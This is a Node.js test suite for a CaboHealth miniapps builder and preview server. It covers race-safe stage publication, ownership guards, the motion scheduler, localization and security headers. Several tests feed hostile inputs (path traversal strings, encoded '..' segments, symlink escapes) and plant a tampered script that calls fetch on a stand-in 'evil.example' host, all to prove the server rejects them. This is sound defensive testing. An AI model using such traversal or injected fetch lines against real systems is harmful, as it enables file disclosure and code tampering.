          assert.equal(existsSync(details.path), false, 'published stage name must remain absent until rename');
          assert.equal(
            readFileSync(join(details.preparationPath, CONTROLLED_STAGE_OWNER_FILE), 'utf8'),
            CONTROLLED_STAGE_OWNER_VALUE,
          );
        },
      });
      assert.equal(observedAtomicPublication, true);
      assert.equal(existsSync(stage), false);
      assert.ok(existsSync(join(outputRoot, 'manifest.json')));
    } finally {
      rmSync(tempRoot, { recursive: true, force: true });
    }
  }
});

test('builder carries the prepared stage inode across atomic publication', async () => {
  const {
    buildMiniapps,
    CONTROLLED_STAGE_OWNER_FILE,
    CONTROLLED_STAGE_OWNER_VALUE,
  } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-stage-publication-race-'));
  const outputRoot = join(tempRoot, 'dist');
  const stage = join(tempRoot, '.dist-stage');
  const displacedStage = join(tempRoot, 'displaced-stage');

  try {
    await assert.rejects(
      buildMiniapps({
        projectRoot,
        outputRoot,
        mode: 'healthy',
        beforeFilesystemOperation({ operation }) {
          if (operation !== 'after-owned-stage-publication') return;
          renameSync(stage, displacedStage);
          mkdirSync(stage);
          writeFileSync(join(stage, CONTROLLED_STAGE_OWNER_FILE), CONTROLLED_STAGE_OWNER_VALUE);
          writeFileSync(join(stage, 'replacement.txt'), 'must survive\n');
        },
      }),
      /identity|ownership|changed/iu,
    );
    assert.equal(readFileSync(join(stage, 'replacement.txt'), 'utf8'), 'must survive\n');
    assert.ok(existsSync(join(displacedStage, CONTROLLED_STAGE_OWNER_FILE)));
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('builder carries the verified next inode through promotion and verifies the promoted target', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-next-promotion-race-'));
  const outputRoot = join(tempRoot, 'dist');
  const displacedNext = join(tempRoot, 'displaced-next');

  try {
    await assert.rejects(
      buildMiniapps({
        projectRoot,
        outputRoot,
        mode: 'healthy',
        beforeFilesystemOperation({ operation, path }) {
          if (operation !== 'after-stage-artifact-verification') return;
          renameSync(path, displacedNext);
          mkdirSync(path);
          mkdirSync(join(path, 'apps/clinic-guide'), { recursive: true });
          writeFileSync(join(path, 'apps/clinic-guide/index.html'), '<!doctype html><title>unreviewed</title>\n');
        },
      }),
      /identity|ownership|verification|changed/iu,
    );
    assert.equal(existsSync(outputRoot), false, 'unverified replacement must not be promoted');
    assert.ok(existsSync(join(displacedNext, 'manifest.json')));
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('builder revalidates the stage inode after its final ownership check before cleanup', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-stage-final-cleanup-race-'));
  const outputRoot = join(tempRoot, 'dist');
  const stage = join(tempRoot, '.dist-stage');
  const displacedStage = join(tempRoot, 'displaced-stage');

  try {
    await assert.rejects(
      buildMiniapps({
        projectRoot,
        outputRoot,
        mode: 'healthy',
        beforeFilesystemOperation({ operation }) {
          if (operation !== 'after-stage-cleanup-ownership-check') return;
          renameSync(stage, displacedStage);
          mkdirSync(stage);
          writeFileSync(join(stage, 'replacement.txt'), 'must survive\n');
        },
      }),
      /identity|ownership|changed/iu,
    );
    assert.equal(readFileSync(join(stage, 'replacement.txt'), 'utf8'), 'must survive\n');
    assert.ok(existsSync(join(outputRoot, 'manifest.json')), 'promoted target remains independently verified');
  } finally {
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('builder refuses to delete unowned output or staging directories', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const outputContainer = mkdtempSync(join(tmpdir(), 'cabohealth-unowned-output-'));
  const outputRoot = join(outputContainer, 'dist');
  const canonicalStage = join(projectRoot, 'miniapps/.dist-stage');
  mkdirSync(outputRoot);
  writeFileSync(join(outputRoot, 'sentinel.txt'), 'unowned output\n');
  try {
    await assert.rejects(
      buildMiniapps({ projectRoot, outputRoot, mode: 'healthy' }),
      /owned|ownership|manifest/iu,
    );
    assert.equal(readFileSync(join(outputRoot, 'sentinel.txt'), 'utf8'), 'unowned output\n');

    mkdirSync(canonicalStage);
    writeFileSync(join(canonicalStage, 'sentinel.txt'), 'unowned stage\n');
    await assert.rejects(
      buildMiniapps({
        projectRoot,
        outputRoot: join(projectRoot, 'miniapps/dist'),
        mode: 'healthy',
      }),
      /owned|ownership|stage/iu,
    );
    assert.equal(readFileSync(join(canonicalStage, 'sentinel.txt'), 'utf8'), 'unowned stage\n');
  } finally {
    rmSync(outputContainer, { recursive: true, force: true });
    rmSync(canonicalStage, { recursive: true, force: true });
  }
});

test('source inventory ignores the controlled stage only at the miniapps root', async () => {
  const { buildMiniapps } = await import(buildModuleUrl.href);
  const nestedStageName = join(projectRoot, 'miniapps/shared/.dist-stage');
  const tempRoot = mkdtempSync(join(tmpdir(), 'cabohealth-nested-stage-name-'));
  mkdirSync(nestedStageName);
  writeFileSync(join(nestedStageName, 'unexpected.txt'), 'must be inventoried\n');
  try {
    await assert.rejects(
      buildMiniapps({ projectRoot, outputRoot: join(tempRoot, 'dist'), mode: 'healthy' }),
      /source[_ ]inventory/iu,
    );
  } finally {
    rmSync(nestedStageName, { recursive: true, force: true });
    rmSync(tempRoot, { recursive: true, force: true });
  }
});

test('network motion policy caps rendering and stops its single scheduler cleanly', async () => {
  const motionSource = read('miniapps/shared/motion.js');
  const {
    computeCanvasBackingStore,
    createFrameScheduler,
    deriveNetworkMotionState,
  } = await import(`data:text/javascript;base64,${Buffer.from(motionSource).toString('base64')}`);

  assert.equal(deriveNetworkMotionState({ ready: true, pageVisible: true, effectVisible: true, pausedByUser: false, reducedMotion: false, saveData: false }), 'playing');
  assert.equal(deriveNetworkMotionState({ ready: true, pageVisible: true, effectVisible: true, pausedByUser: true, reducedMotion: false, saveData: false }), 'paused');
  assert.equal(deriveNetworkMotionState({ ready: true, pageVisible: false, effectVisible: true, pausedByUser: false, reducedMotion: false, saveData: false }), 'waiting');
  assert.equal(deriveNetworkMotionState({ ready: true, pageVisible: true, effectVisible: true, pausedByUser: false, reducedMotion: true, saveData: false }), 'blocked');
  assert.equal(deriveNetworkMotionState({ ready: true, pageVisible: true, effectVisible: true, pausedByUser: false, reducedMotion: false, saveData: true }), 'blocked');

  assert.deepEqual(computeCanvasBackingStore({ cssWidth: 400, cssHeight: 200, devicePixelRatio: 3 }), {
    width: 600,
    height: 300,
    scale: 1.5,
  });
  const constrained = computeCanvasBackingStore({ cssWidth: 2400, cssHeight: 1600, devicePixelRatio: 3 });
  assert.ok(constrained.scale <= 1.5);
  assert.ok(constrained.width * constrained.height <= 1_500_000);

  let nextId = 0;
  const callbacks = new Map();
  const draws = [];
  const canceled = [];
  const scheduler = createFrameScheduler({
    targetFps: 30,
    canRender: () => true,
    draw: ({ now, deltaMs }) => draws.push({ now, deltaMs }),
    requestFrame: (callback) => {
      const id = ++nextId;
      callbacks.set(id, callback);
      return id;
    },
    cancelFrame: (id) => {
      canceled.push(id);
      callbacks.delete(id);
    },
  });
  const present = (now) => {
    const [id, callback] = callbacks.entries().next().value;
    callbacks.delete(id);
    callback(now);
  };

  scheduler.start();
  present(0);
  present(10);
  present(34);
  present(1000);
  assert.deepEqual(draws.map(({ now }) => now), [0, 34, 1000]);
  assert.ok(draws.every(({ deltaMs }) => deltaMs <= 50));
  assert.equal(callbacks.size, 1, 'scheduler must own one pending frame');
  scheduler.stop();
  assert.equal(callbacks.size, 0);
  assert.equal(canceled.length, 1);
});

test('network motion mounts one canvas owner and releases every runtime resource', async () => {
  class FakeEventTarget {
    constructor() {
      this.listeners = new Map();
    }

    addEventListener(type, listener) {
      const listeners = this.listeners.get(type) ?? new Set();
      listeners.add(listener);
      this.listeners.set(type, listeners);
    }

    removeEventListener(type, listener) {
      this.listeners.get(type)?.delete(listener);
    }

    listenerCount() {
      return [...this.listeners.values()].reduce((total, listeners) => total + listeners.size, 0);
    }
  }

  const motionSource = read('miniapps/shared/motion.js');
  const { mountNetworkMotion } = await import(`data:text/javascript;base64,${Buffer.from(motionSource).toString('base64')}`);
  const toggle = new FakeEventTarget();
  const status = { textContent: '' };
  const context = {
    setTransform() {}, clearRect() {}, beginPath() {}, moveTo() {}, lineTo() {}, stroke() {}, arc() {}, fill() {},
  };
  const canvas = {
    width: 0,
    height: 0,
    getContext: () => context,
    getBoundingClientRect: () => ({ width: 400, height: 200 }),
  };
  const media = Object.assign(new FakeEventTarget(), { matches: false });
  const connection = Object.assign(new FakeEventTarget(), { saveData: false });
  const view = Object.assign(new FakeEventTarget(), {
    devicePixelRatio: 3,
    navigator: { connection },
    matchMedia: () => media,
  });
  let nextFrame = 0;
  const frames = new Map();
  const canceled = [];
  view.requestAnimationFrame = (callback) => {
    const id = ++nextFrame;
    frames.set(id, callback);
    return id;
  };
  view.cancelAnimationFrame = (id) => {
    canceled.push(id);
    frames.delete(id);
  };
  let observerCallback;
  let disconnects = 0;
  view.IntersectionObserver = class {
    constructor(callback) {
      observerCallback = callback;
    }

    observe() {}

    disconnect() {
      disconnects += 1;
    }
  };
  const page = Object.assign(new FakeEventTarget(), {
    defaultView: view,
    hidden: false,
    querySelector: (selector) => ({
      '[data-network-canvas]': canvas,
      '[data-motion-toggle]': toggle,
      '[data-motion-status]': status,
    })[selector] ?? null,
  });

  const controller = mountNetworkMotion({ document: page, language: () => 'en' });
  assert.equal(mountNetworkMotion({ document: page, language: () => 'en' }), controller);
  observerCallback([{ target: canvas, isIntersecting: true, intersectionRatio: 1 }]);
  assert.equal(frames.size, 1);
  assert.deepEqual({ width: canvas.width, height: canvas.height }, { width: 600, height: 300 });

  controller.destroy();
  assert.equal(frames.size, 0);
  assert.equal(canceled.length, 1);
  assert.equal(disconnects, 1);
  assert.equal(toggle.listenerCount(), 0);
  assert.equal(page.listenerCount(), 0);
  assert.equal(media.listenerCount(), 0);
  assert.equal(connection.listenerCount(), 0);
  assert.equal(view.listenerCount(), 0);
  assert.deepEqual({ width: canvas.width, height: canvas.height }, { width: 1, height: 1 });
});

test('persisted BFCache pagehide preserves controllers and final pagehide tears them down once', async () => {
  class FakeView {
    constructor() {
      this.listeners = new Map();
    }

    addEventListener(type, listener) {
      const listeners = this.listeners.get(type) ?? new Set();
      listeners.add(listener);
      this.listeners.set(type, listeners);
    }

    removeEventListener(type, listener) {
      this.listeners.get(type)?.delete(listener);
    }

    dispatch(type, event) {
      for (const listener of this.listeners.get(type) ?? []) listener(event);
    }

    listenerCount(type) {
      return this.listeners.get(type)?.size ?? 0;
    }
  }

  const shellSource = read('miniapps/shared/shell.js');
  const { mountPageLifecycle } = await import(`data:text/javascript;base64,${Buffer.from(shellSource).toString('base64')}`);
  const view = new FakeView();
  let destroys = 0;
  const lifecycle = mountPageLifecycle({ view, onDestroy: () => { destroys += 1; } });

  view.dispatch('pagehide', { persisted: true });
  view.dispatch('pageshow', { persisted: true });
  assert.equal(destroys, 0);
  assert.equal(view.listenerCount('pagehide'), 1);

  view.dispatch('pagehide', { persisted: false });
  assert.equal(destroys, 1);
  assert.equal(view.listenerCount('pagehide'), 0);
  lifecycle.destroy();
  assert.equal(destroys, 1);
});

test('enhanced English and Spanish modes keep a visible h1 and localize exact legal actions', async () => {
  class FakeElement {
    constructor(dataset = {}) {
      this.dataset = dataset;
      this.attributes = new Map();
      this.disabled = false;
      this.hidden = false;
      this.label = null;
    }

    addEventListener() {}
    removeEventListener() {}
    setAttribute(name, value) { this.attributes.set(name, value); }
    getAttribute(name) { return this.attributes.get(name) ?? null; }
    querySelector(selector) { return selector === '[data-external-label]' ? this.label : null; }
  }

  const shellSource = read('miniapps/shared/shell.js');
  const { mountShell } = await import(`data:text/javascript;base64,${Buffer.from(shellSource).toString('base64')}`);
  const heading = new FakeElement();
  const englishTitle = new FakeElement({ locale: 'en' });
  const spanishTitle = new FakeElement({ locale: 'es-MX' });
  heading.children = [englishTitle, spanishTitle];
  const englishButton = new FakeElement({ language: 'en' });
  const spanishButton = new FakeElement({ language: 'es-MX' });
  const privacy = new FakeElement({
    externalAction: '',
    labelEn: 'Privacy',
    labelEs: 'Privacidad',
  });
  privacy.label = { textContent: 'Privacy / Privacidad' };
  const documentElement = { dataset: {}, lang: 'en' };
  const page = {
    contains: () => true,
    defaultView: {},
    dispatchEvent() {},
    documentElement,
    querySelector: (selector) => selector === 'h1' ? heading : null,
    querySelectorAll(selector) {
      return {
        '[data-external-action]': [privacy],
        '[data-language]': [englishButton, spanishButton],
        '[data-locale]': [englishTitle, spanishTitle],
      }[selector] ?? [];
    },
  };

  const shell = mountShell({ document: page, storage: null });
  assert.equal(page.querySelector('h1').hidden, false);
  assert.deepEqual(page.querySelector('h1').children, [englishTitle, spanishTitle]);
  assert.equal(englishTitle.hidden, false);
  assert.equal(spanishTitle.hidden, true);
  assert.equal(privacy.label.textContent, 'Privacy');
  assert.equal(privacy.getAttribute('aria-label'), 'Privacy. Opens outside CaboHealth');

  shell.setLanguage('es-MX', { announce: false });
  assert.equal(heading.hidden, false);
  assert.equal(englishTitle.hidden, true);
  assert.equal(spanishTitle.hidden, false);
  assert.equal(privacy.label.textContent, 'Privacidad');
  assert.equal(privacy.getAttribute('aria-label'), 'Privacidad. Se abre fuera de CaboHealth');
  shell.destroy();
});

test('static request resolver serves only built local files and rejects traversal or absent routes', async () => {
  const { resolveStaticRequest } = await import(serveModuleUrl.href);
  await withHealthyBuild(async (outputRoot) => {
    assert.equal(
      resolveStaticRequest(outputRoot, '/apps/healthy-recipes/'),
      join(outputRoot, 'apps/healthy-recipes/index.html'),
    );
    assert.equal(resolveStaticRequest(outputRoot, '/apps/clinic-guide/'), null);
    assert.equal(resolveStaticRequest(outputRoot, '/../../release/public-contact-facts.json'), null);
    assert.equal(resolveStaticRequest(outputRoot, '/%2e%2e/%2e%2e/package.json'), null);
    assert.equal(resolveStaticRequest(outputRoot, '/apps/%2e%2e/manifest.json'), null);
    assert.equal(resolveStaticRequest(outputRoot, '//evil.example/x'), null);
  });
});

test('static request resolver rejects symlinked intermediate directories and realpath escapes', async () => {
  const { resolveStaticRequest } = await import(serveModuleUrl.href);
  await withHealthyBuild(async (outputRoot) => {
    const outside = mkdtempSync(join(tmpdir(), 'cabohealth-preview-outside-'));
    const shared = join(outputRoot, 'apps/shared');
    writeFileSync(join(outside, 'secret.txt'), 'outside\n');
    rmSync(shared, { recursive: true, force: true });
    symlinkSync(outside, shared, 'dir');
    try {
      assert.equal(resolveStaticRequest(outputRoot, '/apps/shared/secret.txt'), null);
    } finally {
      rmSync(shared, { force: true });
      rmSync(outside, { recursive: true, force: true });
    }
  });
});

test('static request resolver rejects symlinked artifact roots and final files', async () => {
  const { resolveStaticRequest } = await import(serveModuleUrl.href);
  await withHealthyBuild(async (outputRoot) => {
    const outside = mkdtempSync(join(tmpdir(), 'cabohealth-preview-final-outside-'));
    const rootAlias = join(outside, 'root-alias');
    const outsideFile = join(outside, 'outside.js');
    const appPath = join(outputRoot, 'apps/healthy-recipes/app.js');
    symlinkSync(outputRoot, rootAlias, 'dir');
    writeFileSync(outsideFile, 'outside\n');
    unlinkSync(appPath);
    symlinkSync(outsideFile, appPath, 'file');
    try {
      assert.equal(resolveStaticRequest(rootAlias, '/apps/healthy-recipes/index.html'), null);
      assert.equal(resolveStaticRequest(outputRoot, '/apps/healthy-recipes/app.js'), null);
    } finally {
      rmSync(rootAlias, { force: true });
      rmSync(outside, { recursive: true, force: true });
    }
  });
});

test('preview refuses a missing or non-release-safe manifest before creating a server', async () => {
  const { createMiniappsServer } = await import(serveModuleUrl.href);
  await withHealthyBuild(async (outputRoot) => {
    const manifestPath = join(outputRoot, 'manifest.json');
    const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'));
    writeFileSync(manifestPath, `${JSON.stringify({ ...manifest, releaseReady: true }, null, 2)}\n`);
    assert.throws(
      () => createMiniappsServer({ projectRoot, root: outputRoot }),
      /manifest|verification|release/iu,
    );
  });
});

test('preview serves an immutable verified snapshot even if artifact files change afterward', async () => {
  const { loadVerifiedArtifactSnapshot } = await import(serveModuleUrl.href);
  await withHealthyBuild(async (outputRoot) => {
    const appPath = join(outputRoot, 'apps/healthy-recipes/app.js');
    const original = readFileSync(appPath);
    const snapshot = loadVerifiedArtifactSnapshot({ projectRoot, root: outputRoot });
    writeFileSync(appPath, 'globalThis["fetch"]("https://evil.example/");\n');
    assert.deepEqual(snapshot.read('/apps/healthy-recipes/app.js'), original);
    assert.equal(snapshot.read('/apps/clinic-guide/'), null);
  });
});

test('preview captures only reviewed artifact paths when the manifest is replaced after verification', async () => {
  const { loadVerifiedArtifactSnapshot } = await import(serveModuleUrl.href);
  await withHealthyBuild(async (outputRoot) => {
    const healthyPath = join(outputRoot, 'apps/healthy-recipes/app.js');
    const healthyBytes = readFileSync(healthyPath);
    let replacementRan = false;
    const snapshot = loadVerifiedArtifactSnapshot({
      projectRoot,
      root: outputRoot,
      afterArtifactVerification() {
        replacementRan = true;
        const clinicRelativePath = 'apps/clinic-guide/index.html';
        const clinicBytes = Buffer.from('<!doctype html><title>Unreviewed Clinic</title>\n');
        const clinicPath = join(outputRoot, clinicRelativePath);
        mkdirSync(dirname(clinicPath), { recursive: true });
        writeFileSync(clinicPath, clinicBytes);
        const manifestPath = join(outputRoot, 'manifest.json');
        const manifest = JSON.parse(readFileSync(manifestPath, 'utf8'));
        manifest.files = [...manifest.files, {
          path: clinicRelativePath,
          size: clinicBytes.byteLength,
          sha256: createHash('sha256').update(clinicBytes).digest('hex'),
        }].sort((left, right) => left.path.localeCompare(right.path));
        writeFileSync(manifestPath, `${JSON.stringify(manifest, null, 2)}\n`);
      },
    });

    assert.equal(replacementRan, true);
    assert.deepEqual(snapshot.read('/apps/healthy-recipes/app.js'), healthyBytes);
    assert.equal(snapshot.read('/apps/clinic-guide/index.html'), null);
  });
});

test('preview sends the exact security headers for success and error responses', async () => {
  const { createMiniappsServer } = await import(serveModuleUrl.href);
  await withHealthyBuild(async (outputRoot) => {
    const server = createMiniappsServer({ projectRoot, root: outputRoot });
    const expected = {
      'content-security-policy': "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'none'; font-src 'self'; frame-src 'none'; object-src 'none'; form-action 'none'; base-uri 'none'; worker-src 'none'; media-src 'none'",
      'permissions-policy': 'camera=(), microphone=(), geolocation=(), payment=(), usb=()',
      'referrer-policy': 'no-referrer',
      'x-content-type-options': 'nosniff',
      'x-frame-options': 'DENY',
    };
    for (const [method, path, status] of [
      ['GET', '/apps/healthy-recipes/', 200],
      ['HEAD', '/apps/healthy-recipes/', 200],
      ['GET', '/absent', 404],
      ['POST', '/apps/healthy-recipes/', 405],
    ]) {
      const recorded = { body: undefined, headers: {}, status: 0 };
      const response = {
        writeHead(nextStatus, headers) {
          recorded.status = nextStatus;
          recorded.headers = Object.fromEntries(Object.entries(headers).map(([name, value]) => [name.toLowerCase(), value]));
        },
        end(body) {
          recorded.body = body;
        },
      };
      server.emit('request', { method, url: path }, response);
      assert.equal(recorded.status, status);
      assert.deepEqual(
        Object.fromEntries(Object.keys(expected).map((name) => [name, recorded.headers[name]])),
        expected,
      );
      if (method === 'HEAD') assert.equal(recorded.body, undefined);
    }
  });
});

test('deployment source guard accepts only the verified canonical dist and never miniapp sources', async () => {
  const { assertVerifiedMiniappDeploymentSource, buildMiniapps } = await import(buildModuleUrl.href);
  const canonicalDist = join(projectRoot, 'miniapps/dist');
  await buildMiniapps({ projectRoot, outputRoot: canonicalDist, mode: 'healthy' });
  assert.equal(
    assertVerifiedMiniappDeploymentSource({ projectRoot, outputRoot: canonicalDist }),
    canonicalDist,
  );
  assert.throws(
    () => assertVerifiedMiniappDeploymentSource({
      projectRoot,
      outputRoot: join(projectRoot, 'miniapps/clinic-guide'),
    }),
    /canonical|verified|deployment|unsafe/iu,
  );
});

test('package scripts keep the full release build gated and expose the independently green slice', () => {
  const scripts = readJson('package.json').scripts;
  assert.equal(scripts['miniapps:build'], 'node scripts/build-miniapps.mjs --release');
  assert.equal(scripts['miniapps:build:healthy'], 'node scripts/build-miniapps.mjs --healthy');
  assert.equal(scripts['miniapps:serve'], 'node scripts/serve-miniapps.mjs');
  assert.equal(scripts['miniapps:verify'], 'node --test tests/miniapps-content.test.mjs tests/miniapps-build.test.mjs');
});
